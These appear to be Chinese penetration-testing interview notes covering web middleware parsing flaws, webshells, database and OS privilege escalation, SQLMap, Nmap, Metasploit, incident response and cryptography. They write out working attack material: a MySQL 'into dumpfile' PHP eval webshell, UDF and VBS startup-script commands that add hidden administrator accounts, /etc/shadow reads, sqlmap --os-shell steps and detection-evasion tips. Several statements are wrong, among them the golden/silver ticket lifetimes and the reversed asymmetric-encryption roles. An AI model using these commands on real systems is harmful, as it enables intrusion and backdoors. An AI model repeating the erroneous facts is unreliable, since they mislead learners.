1- URI（统一资源标识符）是一个更通用的概念，用于唯一标识资源，可为网络上任何类型的资源，不限于网页。包括两个子集：URL 和 URN（Uniform Resource Name）
2- URL（统一资源定位符）是 URI 的一个特定类型，用于定位资源的具体位置。URL 提供一种访问和获取资源的方式。包含协议（如 HTTP、FTP）、主机名（如 www.example.com）和路径（如 /images/pic.jpg），可直接指向资源所在网络位置
3- URN（统一资源名称）是 URI 的另一个子集，用于唯一命名资源而无需指定其位置。URN 不提供访问资源的方法，只提供唯一名称。如 urn:isbn:9783161484100 可用于唯一标识一本图书，但不表示该图书具体位置
# 总结起来，URI 是通用标识符概念，用于唯一标识资源。URL 是 URI 的一种具体类型，用于定位资源并提供访问方式。而 URN 用于提供资源的唯一名称而无需指定位置
```

## 0x00x029 常见中间件及解析漏洞

```shell
# 中间件
	1- IIS 6.x
	2- IIS 7.5
	3- Apache
	4- Nginx
	5- Tomcat
	6- Weblogic
	7- Jboos
# 1- IIS 6.X，asp 目录默认解析asp 文件
多数为Windows Server 2003，网站较老，要支持 aspx 需安装.NET框架
	1.1- 利用 2003 系统特性，凡文件名后出现 \/.:;* 都被舍弃
			如：www.xxx.com/xx.asp；.jpg
	1.2- 凡文件名以 apx 结尾，里面的任何文件都被当作脚本语言解析
	1.3- 除 asp、aspx 外，cer、cdx、asa 等后缀都可被当作 asp 或 aspx 脚本语言解析
		如：mamu.cer muma.cdx mamu.asa
# 4-IIS 7.5，.jpg/.php 形式的解析
	# Nginx 和 IIS7.5 都因开启 CGI.FIX_PATHINFO 参数，默认以 CGI 方式支持 PHP 解析
	1- 在任意后缀后面加上x.php
		如：www.xxx.com/logo.jpg/x.php
			 www.xxx.com/logo.txt/x.php
			 www.xxx.com/logo.doc/x.php
# 2- Apache，从右向左解析规则漏洞
	1- muma.php.xxx.aaa 从左往右解析执行
# 3- Nginx，.jpg/1.php；00% 截断
	1- www.xxxx.com/1.jpg/1.php
	2- www.xxxx.com/1.jpg%00.php
	3- www.xxxx.com/1.jpg/%20\0.php

```

## 0x00x030 编辑器漏洞

```shell
# 其实还是文件上传漏洞
	1- 	FCKeditor 编辑器
	2-	EWEbeditor 编辑器
	3-	DotNetTextBox 编辑器
	4-	Kedit 编辑器
	5-	Cute Editor 在线编辑器
# 这个问题基本回答个两三个就可以
```

## 0x00x031  Access 本地利用

```shell
# access 扫出后缀为 asp 的数据库文件，访问乱码，如何实现到本地利用
	1- 迅雷下载，直接改后缀为.mdb。
```

## 0x00x032 IIS 服务器应如何做保护措施

```shell
# IIS 服务器应该做哪些方面的保护措施
	1- 保持 Windows 升级
	2- 使用 IIS 防范工具
	3- 移除缺省 Web 站点
	4- 卸载不需要的服务，如 FTP 和 SMTP 
	5- 有规则检查管理员组和服务
	6- 严格控制服务器的写访问权限
	7- 设置复杂密码
	8- 减少/排除 Web 服务器上的共享
	9- 禁用 TCP/IP 协议中的 NetBIOS
	10- 使用 TCP 端口阻塞
	11- 仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat
	12- 管理 IIS 目录安全
	13- 使用 NTFS 安全
	14- 管理用户账户
	15- 审计 Web 服务器
```

## WEB 渗透疑问 附加

### 00x00 什么是 Webshell，如何拿网站 Webshell

```shell
1- Webshell 是一种恶意脚本，通常用于攻击者在网站上植入后门，以便控制被攻击的网站。Webshell 可允许攻击者上传、下载和执行文件，修改网站配置，甚至控制服务器
2- 要获取网站 Webshell，攻击者通常需利用网站安全漏洞，如 SQL 注入、XSS 攻击或其他漏洞，攻击者可通过这些漏洞在网站上放置恶意脚本，从而获取 Webshell
```

### 00x01 CMS 渗透时扫描目录的意义

```shell
# 一个成熟且相对安全的  CMS，渗透时扫描目录的意义？
	1- 发现隐藏的敏感文件和二级目录
	2- 收集有关 CMS 版本和插件的信息
	3- 识别默认/弱密码(站长误操作，错误配置)
	4- 利用已知程序漏洞，检测路径遍历和敏感文件泄露
```

### 00x02 上传大马后访问乱码

```shell
# 上传大马后访问乱码解决办法
	1- 浏览器中改编码
```

### 00x03 渗透时看到编辑器应干什么

```shell
# 在某后台新闻编辑界面看到编辑器，应先做什么
	1- 查看编辑器的名称版本，搜索公开的漏洞
```

### 00x04  为何 MySQL 数据库站点只 80 端口开放

```
1- 端口更改
2- 站库分离
3- 3306 端口不对外开放
```

### 00x05 3389 无法连接的几种情况

```shell
1- 未开放 3389 端口
2- 端口被修改
3- 防护拦截
4- 处于内网(需进行端口转发)
```

### 00x06 GET 和 POST 区别

```shell
1- GET 请求可被缓存，POST 请求不会被缓存
2- GET 请求保留在浏览器历史记录中，POST 请求不会保留在浏览器历史记录中
3- GET 请求可被收藏为书签，POST 请求不能被收藏为书签
4- GET 请求对数据长度有限制，POST 请求没有限制
5- GET 请求只应当用于取回数据，POST 请求应当用于修改数据

6- 安全性：POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中
7- 数据类型：GET 只允许 ASCII 字符，而 POST 支持整个 ISO10646 字符集
8- 数据长度：GET 传输数据量小，主要受 URL 长度限制；而 POST 可传输大量数据
9- 可见性：GET 在 URL 中对所有人都可见，而 POST 不会显示在 URL 中

# 本质尚 GET 和 POST 无区别，均为 HTTP 协议
```

### 00x07  Webshell 拿到站点如何利用 .htaccess 文件

```shell
# 拿到一个 webshell 发现网站根目录下有.htaccess 文件，能做什么
# .htaccess 文件是 Apache 服务器的配置文件，允许管理员在网站根目录下设置各种网站配置和安全性选项。可尝试以下操作：
	1- 查看文件内容：打开 .htaccess 文件查看其中的内容，可揭示有关网站配置和安全性的信息
	2- 检查安全性设置：.htaccess 文件可用于配置安全性选项，如访问控制、文件权限等，可确定是否存在任何限制或漏洞
	3- 修改网站配置：.htaccess 文件可用于修改网站的配置，如重定向、错误页面等，可尝试修改某些设置以查看是否对网站的行为产生影响
# 可插入解析信息：
<FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php </FilesMatch>
制造 apache 解析漏洞 ,.jpg 文件会被解析成 .php 文件
```

### 00x08 为何 ASPX 木马权限比 ASP 大

```shell
# ASPX 木马和 ASP 木马都是基于 .NET 技术开发
ASP 木马只能访问系统的文件和目录，而 ASPX 木马可利用 .NET 框架特性访问数据库等更多系统资源，ASPX 木马具有更大权限，且可更容易利用系统权限进行攻击
ASPX 木马可利用 .NET 框架特性实现更多的功能，如利用反射加载程序集、调用非公开函数等，从而获得更大的权限
```

### 00x09 Webshell 有 System 权限无法执行命令原因

```shell
1- 命令执行被限制：有些服务器环境可能会限制或禁止执行某些命令，特别是危险系统命令。可尝试执行其他命令或使用不同命令语法，看看是否有执行权限。如尝试使用反斜杠 `\` 或尝试在命令前加上绝对路径。另可尝试使用其他命令执行函数，如 `eval()` 或者 `system()`
2- 安全软件或防火墙阻止命令执行：服务器可能安装安全软件或防火墙，可能会检测到 Webshell 并阻止执行命令。可尝试使用不同 Webshell 或通过修改 Webshell 代码，绕过检测。可尝试使用反向 Shell 连接伪装常见网络流量以躲避监测
3- 凭证不足：Webshell 具有系统权限也可能存在某些操作需更高特权级别才能执行。可尝试提升权限，寻找更高权限的用户或漏洞，如尝试以 root 用户身份执行命令
4- 服务器配置问题：有时服务器配置可能会限制命令执行。可检查服务器配置文件，如 Apache 的 .htaccess 文件或 Nginx 配置文件，看是否有相关限制配置。有可尝试修改以允许命令执行
```

### 00x10 安全狗是否会追踪变量发现一句话木马

```shell
# 安全狗会追踪变量，从而发现出是一句话木马吗？ 根据特征码
安全狗是一种安全防护软件，主要防范针对网站的 CC 攻击和 SQL 注入攻击。通过分析网站变量的变化判断是否遭受攻击，从而采取相应的防护措施。若一句话木马涉及到变量的修改或替换，安全狗可能会通过追踪变量来发现
# 若一句话木马未修改或替换任何变量，或采取其他手段避免被安全狗检测到，安全狗就可能无法发现。安全狗的检测能力取决于具体情况和一句话木马的设计
```

### 00x11 Wireshark 过滤规则

```shell
# Wireshark 一款用于网络协议分析的工具，提供强大的过滤功能，可帮助用户在网络流量中筛选出感兴趣的数据包。以下是常用 Wireshark 过滤规则示例：
1. 根据IP地址过滤：
   - ip.addr == 192.168.0.1：只显示源或目标IP地址为192.168.0.1的数据包。
   - ip.src == 192.168.0.1：只显示源IP地址为192.168.0.1的数据包。
   - ip.dst == 192.168.0.1：只显示目标IP地址为192.168.0.1的数据包。
2. 根据协议过滤：
   - tcp：只显示TCP协议的数据包。
   - udp：只显示UDP协议的数据包。
   - http：只显示HTTP协议的数据包。
3. 根据端口号过滤：
   - tcp.port == 80：只显示目标或源端口号为80的TCP数据包。
   - udp.port == 53：只显示目标或源端口号为53的UDP数据包。
4. 逻辑运算符：
   - and：逻辑与运算符，用于同时满足多个过滤条件，例如：ip.src == 192.168.0.1 and tcp.port == 80。
   - or：逻辑或运算符，用于满足任一过滤条件，例如：tcp.port == 80 or tcp.port == 443。
5. 根据协议字段过滤：
   - http.host == "www.example.com"：只显示目标或源HTTP请求或响应中的主机字段为"www.example.com"的数据包。
   - http.request.method == "GET"：只显示HTTP GET请求的数据包。
6. 根据数据包长度过滤：
   - frame.len > 100：只显示数据包长度大于100字节的数据包。
# 以上只是常见的 Wireshark 过滤规则示例，可根据具体需要和分析要求，使用不同过滤条件筛选所需的数据包。在 Wireshark 的界面中，可使用过滤栏或在过滤器表达式框中直接输入过滤规则应用过滤
```



## 0x00x033 数据库类型

```shell
# 数据库可以分为关系型数据库和非关系型数据库两大类。
1- 关系型数据库（RDBMS）：
	1.1- MySQL: 开源的关系型数据库管理系统，被广泛应用于各种应用程序中
	1.2- Oracle: 功能丰富的商业关系型数据库管理系统，适用于大型企业级应用程序
	1.3- Microsoft SQL Server: 由 Microsoft 开发的关系型数据库管理系统，与 Windows 操作系统集成紧密
	1.4- PostgreSQL: 开源的关系型数据库管理系统，具有高度的扩展性和可靠性
	1.5- Microsoft Access
2- 非关系型数据库（NoSQL）：
	2.1- MongoDB: 开源的文档型数据库，存储数据以灵活的文档格式（如 JSON）
	2.2- Redis: 开源的内存数据库，用于高速数据缓存和键值存储
	2.3- Cassandra: 分布式、高可扩展性的列式数据库系统，设计用于处理大量数据
	2.4- Neo4j: 图形数据库，用于存储和处理具有图形结构的数据，适用于图形数据分析和推荐系统
	2.5- HBase
	2.6- BigTable
除上述常见数据库类型，还有些特定用途的数据库：
1- 搜索引擎数据库：如 Elasticsearch，专用于全文搜索和实时分析
2- 时间序列数据库：如 InfluxDB，专用于存储和分析时间序列数据，如传感器数据、日志数据等
3- 对象存储数据库：如 Amazon S3、Google Cloud Storage，专用于存储和管理大规模的非结构化数据
# 数据库类型在适用场景、数据结构、数据模型和性能特点上有所区别，选择合适的数据库取决于应用程序的需求和数据处理的规模
```

## Bypass 附加

### 00x00 如何绕过 WAF



### 00x01 宝塔禁止 PHP 函数如何绕过



## 0x00x034 MySQL 写 shell

```shell
# 写 shell 必要条件
	1- 必须 root 权限
	2- 知道网站绝对路径
	3- my.ini 配置文件中 secure_file_priv 函数配置必须为空
# 写 shell
	select '一句话' into outfile '路径';
	select '一句话' into dumpfile '路径';
	select '<?php eval($_POST[1]) ?>' into dumpfile '路劲.muma.php';
```

## 0x00x035 域渗透

```shell
1- 制作白银票据
2- 制作黄金票据

二者区别：黄金票据只有30分钟，白银票据是永久

# 域内攻击手法
	1- MS14-068
	2- Roasting 攻击离线爆破密码
	3- 委派攻击
	4- 非约束性委派
	5- 基于资源的约束委派
	6- ntlm relay；
```



## 0x00x036 Win/Linux 提权

```shell
# Win 提权
	1- 内核提权 systeminfo 寻找对应 EXP
	2- whoami /all 查看用户权限
# Linux 提权
	1- 脏牛提权
		脏牛提权的了解
	2- sodu 提权
	3- 内核提权
```

## 0x00x037 数据库提权

```shell
# MySQL
	1- MOF 提权
	2- UDF 提权
	3- VBS 启动项提权
# SQLServer
	1- xp_cmdshell 扩展存储函数提权
	2- 差异备份提权
# Access
```

## 0x00x038 MySQL UDF 提权常用命令

```shell
create function cmdshell returns string soname 'udf.dll';
select cmdshell('net user liuyazhuang lyz123 /add');
select cmdshell('net localgroup administrators liuyazhuang /add');
select cmdshell('net localgroup administrators');
select cmdshell('ipconfig/all');
select cmdshell('net user');
select cmdshell('regedit /s d:\wwwroot\3389.reg');
drop function cmdshell;
select cmdshell('netstat -an');
```

## 0x00x039 MySQL VBS 启动项提权

```shell
# 原理概述
WebShell 连接数据库，建立表 a 将 VBS 脚本写入表中，然后导入启动项；该脚本仅对中文版 OS 系统有效，使用其他语言版本仅需对 "C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs" 脚本进行相应更改。在 VBS 脚本后面有一个"0"，表示不弹出 CMD 窗口，以静默模式运行。该方法是在通过UDF 提权失败情况下，将 VBS 插入启动项中，待系统重启后将自动添加一个用户，
# 执行语句
create table a (cmd text); # 创建一个 a 表 cmd 字段 text 是字段类型
insert into a values("set wshshell=createobject(""wscript.shell"") " ); # 在 a 表插入一个 vbsshell 语句
insert into a values("a=wshshell.run(""cmd.exe /c net user xxoo 123123 /add"",0) " ); # 用 VBSshell 执行一个添加用户的操作
insert into a values("b=wshshell.run(""cmd.exe /c net localgroup administrators xxoo /add"",0) " ); # 用 VBSshell 执行将 xxoo 用户添加到管理员组
select * from a into outfile "C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs"; # 将 a 表内容插或写入到启动项目录下，且保存文件名为 a.vbs
```

## 0x00x040 Linux 下 MySQL 提权

```shell
mysql -hlocalhost -uroot -p
system useradd hacker
system passwd hacker
system tail -l /etc/passwd
system tail -l /etc/shadow
```

## 提权 附加

### 00x00 提权为何选择不带空格目录

```shell
# 提权时选择可读写目录，为何尽量不用带空格目录
	1- exp 执行多半需空格界定参数
```

## 0x00x041 SQLMap

```shell
1- SQLmap 注入工具
# 关键函数
	--is-dba 								# 当前用户权限（是否为 root 权限，mssql 下最高权限为 sa）
	--dbs									# 所有数据库
	--current-db							# 网站当前数据库
	--users 								# 所有数据库用户
	--current-user 							# 当前数据库用户
	--random-agent 							# 构造随机 User-Agent
	--passwords 							# 数据库密码
	--proxy http://local:8080 –threads 10   	# (可以自定义线程加速) 代理
	--time-sec=TIMESEC DBMS					# 响应的延迟时间（默认为5秒
	--threads=                       			# 使用多少线程
	--batch									# 自动化选择
# Cookie 注入
	sqlmap.py -u "http://www.xxx.com?id=1注入点" --cookie="cookie 值" --current-db
# POST 注入
	sqlmap -r "数据包地址" -p "需要制定的参数" –dbms 需要制定的数据类型
# GET 注入
	sqomap -u “注入点地址” --dbs 跟上你需要的参数
# 交互式写 shell
	1- 前提条件：最高权限、web 网站绝对路径、能获取 cookie
	2- sqlmap.py -u "注入点地址" --cookie="cookie值" --os-shell
		2.1- echo "一句话木马"网站绝对路径
	3- 输入 web 网站的绝对路径
	4- 传木马
```

## 0x00x042 Nmap

```shell
# Nmap 网络扫描和主机检测的工具
# 常用的参数
	nmap www.baidu.com　　  			  			# 扫描单一主机
	nmap 192.168.1.154 　　　			　		# 扫描单一主机
	nmap 192.168.1.1/24　　			 　		# 扫描整个子网
	nmap 192.168.1.154 192.168.1.156    		# 扫描多个目标
	nmap 192.168.1.1-100 　　　　   	  		# 扫描 IP 地址为 192.168.1.1-192.168.1.100 内所有主机
	nmap -iL target.txt　　　　			  		# 扫描批量 IP 地址
	nmap 192.168.1.1/24 -exclude 192.168.1.1 	 # 扫描除过某一个 IP 外所有子网主机
	nmap 192.168.1.1/24 -exclude file xxx.txt  	 # xxx.txt 中的文件将会从扫描的主机中排除
	nmap -p80,21,23 192.168.1.154　　				# 扫描特定主机上 80、21、23 端口
	nmap -sS 192.168.1.1						 # 半开放扫描
	namap --script==vuln						 # 扫漏洞，比较重的一个
	namp -oN									# 保存扫描结果
# 基本这些就够用了，如果有大佬觉得还有更好的使用方式欢迎补充啊，跪谢
```

## 0x00x043 MSF

```shell
# 常用命令
	background 										# 让meterpreter 处于后台模式
	sessions -i number 								# 与会话进行交互，number 表示第 n 个session
	quit 											# 退出会话
	shell 											# 获得命令行
	cat c:\\boot.ini 								# 查看文件内容
	getwd 											# 查看当前工作目录 work directory
	upload /root/Desktop/netcat.exe c:\\ 			# 上传文件到目标机上
	download 0xfa.txt /root/Desktop/ 				# 下载文件到本机上
	edit c:\\boot.ini 								# 编辑文件
	search -d d:\\www -f web.config 				# search 文件
	ps 												# 查看当前活跃进程
	migrate pid 									# 将 Meterpreter 会话移植到进程数 w 为 pid 进程中
	execute -H -i -f cmd.exe 						# 创建新进程 cmd.exe，-H 不可见，-i 交互
	getpid 											# 获取当前进程 pid
	kill pid 										# 杀死进程
	getuid 											# 查看权限
	sysinfo 										# 查看目标机系统信息，如机器名，操作系统等
	getsystem 										# 提权操作
	timestompc:/a.doc -c "10/27/2015 14:22:11" 			# 修改文件的创建时间
# 迁移进程
	1- meterpreter > ps
	2- 自行选择 PID
	3- meterpreter > migrate pid

# 还可以做免杀木马等等。。。。MSF 蛮强大的
```

## 0x00x044 冰蝎

```shell
# webshell 管理工具；
# 流量特征：
  1- Accept: application/json, text/javascript;
  2- Content-type: Application/x-www-form-urlencoded
  3- eval($port);
```

## 0x00x045 蚁剑

```shell
# 流量特征：_0x、@ini_set
```

## 0x00x046 蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处



## 应急响应 附加

### 00x00 Web 服务器被入侵后如何排查

```shell
# 当发现 Web 服务器被入侵后，以下是一些常见的排查步骤：
1. 确认入侵：首先，确认是否真的存在入侵。检查服务器的日志文件，包括访问日志、错误日志和系统日志，寻找异常的活动记录或异常的网络连接。
2. 隔离受影响的服务器：一旦发现入侵，立即从网络中隔离受影响的服务器。这样可以阻止攻击者对其他系统或数据的进一步访问。
3. 收集证据：在进行任何操作之前，务必先收集证据。这包括保留相关日志文件、截屏、记录异常行为等。这些证据在事后的调查和法律追诉中可能起到重要作用。
4. 安全扫描：运行安全扫描工具来检测服务器的漏洞和弱点。这可以帮助找出可能被入侵者利用的安全漏洞或后门。
5. 恢复受感染的系统备份：如果有可用的备份，可以考虑重新构建受影响的服务器。确保备份是受信任且不受感染的。
6. 弥补漏洞：找出被利用的漏洞并进行修补。这可能涉及到安装系统和应用程序的安全更新、修复配置错误、更新密码、限制访问等一系列操作。
7. 清除恶意软件：扫描服务器以查找和清除可能存在的恶意软件或后门程序。使用安全工具来扫描服务器的文件系统和注册表，以确保系统干净。
8. 密码和访问控制管理：重置被入侵的用户帐户和管理员密码，并重新评估服务器的访问控制策略。确保只有授权的人员能够访问服务器。
9. 安全加固：对服务器进行安全加固，如关闭不必要的服务、配置入侵检测系统和防火墙、限制远程访问等。确保服务器的安全配置符合最佳实践。
10. 监控和审计：重点加强对服务器的监控和审计。实施实时监控系统，以便及早发现任何潜在的入侵活动，并记录所有关键的系统事件和日志。
# 请注意，此处的排查步骤是针对一般情况而言。严重的入侵可能需要更复杂和深入的排查和恢复过程。在处理入侵事件时，建议与安全专家或公司合作，确保有效解决问题，并采取预防措施以避免今后再次发生类似事件。
```



## 安全相关了解

### 00x00 

```shell
# 网络钓鱼（Phishing）
指通过虚假电子邮件、即时通讯等方式诱骗用户点击链接或下载附件，达到非法获取用户个人信息或控制用户电脑的目的。通常伪装成银行、电商、邮箱等官方网站骗取用户的账号、密码、信用卡信息等

# 震网病毒（Stuxnet）
一款针对工业控制系统的恶意软件，于 2010 年首次被发现，主要针对伊朗的核电站，可通过感染工业控制系统的计算机，从而控制工业设备，造成严重的破坏。

# 蜜罐(honeypot) 
一种用來捕捉入侵者的电脑系統，通常伪装成有价值的目标以吸引入侵者进入并被捕获。可用來收集入侵者信息，如使用的工具、技能及试图攻击的系統。也可用來阻止入侵者，攻击者可能会认为蜜罐是真正的目标且不会继续攻击其他系統

# CC 攻击
(也称为拒绝服务攻击) 是一种试图使网站或服务不可用的方法。攻击者通常向目标发送大量流量，以使其超载并无法处理正常的流量。可由个人或组织发动，且可对企业造成重大损失

# DDOS
(分布式拒绝服务攻击) 是一种试图使网站或服务不可用的方法。攻击者通常会使用多个计算机来发送大量流量到目标，以使其超载并无法处理正常的流量。DDoS 攻击可以由个人或组织发动，且可对企业造成重大损失

# DDOS 防护
	1- 流量清洗：通过过滤、丢弃或重定向恶意流量，来保护目标服务器或网络
	2- 负载均衡：将来自多个客户端的请求分发到多个服务器，以提高服务器的处理能力
	3- 防火墙：在网络中设置一道屏障，以阻止恶意流量进入网络
	4- 入侵检测系统：通过监控网络流量，检测和阻止恶意攻击

# 人肉搜索
(也称为反向搜索) 是一种搜索有关某人或某事资讯的方法，通过网上搜索姓名、地址或其他个人资讯。如有关某人个人资讯，如电话号码、电子邮件地址、社交媒体账户、犯罪记录或财务状况
 
# 脱壳
又称脱离壳，是指计算机病毒在感染计算机后将自己的代码注入到宿主程序中，并在宿主程序运行时执行从而实现自身的传播和感染。脱壳技术是病毒的一种常见手段，可帮助病毒躲避杀毒软件的检测，并提高病毒的传播能力
 
# 手机"越狱"
指通过修改手机系统的权限，使手机可安装非官方应用程序。越狱后手机功能会得到很大提升，可安装各种各样的应用程序，但也存在一定风险，如手机可能会被黑客入侵
 
# 宏病毒
一种通过宏语言编写的病毒，可感染各种各样的文档，如 Word、Excel、PowerPoint 等。通常会在用户打开被感染的文档时自动运行，并在用户电脑上进行恶意操作，如删除文件、修改系统设置等
 
# APP 加壳
指在 APP 的二进制文件中插入一段代码，以保护 APP 的代码不被反编译。加壳后 APP 的代码会被加密，通过特定解壳工具才能解密。加壳可防止 APP 被反编译，也会增加 APP 的体积和运行时间
 
# 0day 漏洞
指被发现后立即被利用的安全漏洞。0day漏洞是安全领域的一个术语，指的是被发现后立即被恶意利用的安全漏洞。0day漏洞的威胁在于其具有未知性和突发性，往往令安全机构和厂商措手不及，难以有效防范和应对

# 获取网络安全知识途径
安全社区、SRC 平台、安全群、知识星球
```

## 对称/非对称加密

```shell
# 对称加密
加密解密用同一个密钥
 
# 非对称加密
即公钥和私钥，公钥用于加密，私钥用于解密。非对称加密机制的特点是，公钥是公开的，任何人都可以获得，而私钥是保密的，只有拥有私钥的人才能解密
发送方生成一对密钥，公钥和私钥；发送方将公钥公开，而私钥保密；接收方获得发送方的公钥；发送方使用自己的私钥对数据进行加密；接收方使用发送方的公钥对数据进行解密。
```

### 00x00 RSA 算法

```shell
# RSA 算法（Rivest–Shamir–Adleman algorithm）又称公钥加密算法，是目前最广泛使用的非对称加密算法，由罗纳德·李维斯特（Ronald L. Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard M. Adleman）在 1978 年提出。
RSA 算法使用一对大素数 p 和 q，相乘得到大整数 n。从 n 中选择一个整数 e，使得 e 和 (p-1)(q-1) 互质。整数 e 就是公钥，而另一个整数 d 就是私钥。
加密时，发送方使用公钥 e 和明文 M 计算密文 C：
C = M^e mod n
解密时，接收方使用私钥 d 和密文 C 计算明文 M：
M = C^d mod n
# RSA 算法安全性基于大整数分解问题。若能在合理时间内找到 p 和 q，就可计算出 d 破解 RSA 算法。目前还没任何有效方法可快速分解大整数，RSA 算法仍然是安全的
# RSA 算法有以下优点：
	1- 安全性高。RSA 算法使用大素数，因此很难破解。
	2- 可靠性高。RSA 算法已被广泛使用，且无被破解案例
	3- 效率高。RSA 算法在计算上比较高效
# RSA 算法也有以下缺点：
	1- 计算复杂度高。RSA 算法的计算复杂度比较高
	2- 通信开销大。RSA 算法的通信开销比较大
	3- 私钥管理困难。RSA 算法的私钥管理比较困难
```

### 00x01 AES ／ DES 算法

```shell
# DES 算法的具体工作步骤：
1. 密钥生成：选择和生成一个56位的密钥，经过一系列的处理得到16个子密钥，每个子密钥是48位。
2. 初始置换（Initial Permutation）：对输入的64位明文进行初始的位重排。
3. 分组：将64位的明文分为左右两个32位的部分，记作L0和R0。
4. 加密轮运算：DES算法包含16轮加密迭代，每一轮的步骤包括：右半部分R(i-1)与子密钥Ki进行异或运算，然后经过F函数得到一个32位的输出，与左半部分L(i-1)进行异或运算得到Ri，并且交换L(i-1)和Ri得到下一轮的输入L(i)=R(i-1)，R(i)=Ri。
5. 最终置换（Final Permutation）：经过16轮加密迭代后，将得到的L16和R16合并，并进行最终的位重排，得到64位的密文。
6. 密文输出：输出64位的密文。
# AES算法的具体工作步骤：
1. 密钥扩展：根据密钥长度（128位、192位或256位），生成一系列的轮密钥，用于每一轮的加密运算。
2. 初始轮：将输入的明文分块，进行初始的AddRoundKey操作，使用第一个轮密钥与明文进行异或运算。
3. 多轮运算：对于128位密钥长度，进行9轮的加密迭代，对于192位和256位密钥长度，进行11轮和13轮的加密迭代。每一轮的步骤包括：SubBytes（字节代替）操作、ShiftRows（行移位）操作、MixColumns（列混淆）操作和AddRoundKey（轮密钥加）操作。
4. 最后一轮：进行最后一轮的加密迭代，去掉MixColumns操作。
5. 密文输出：得到加密后的密文。
```
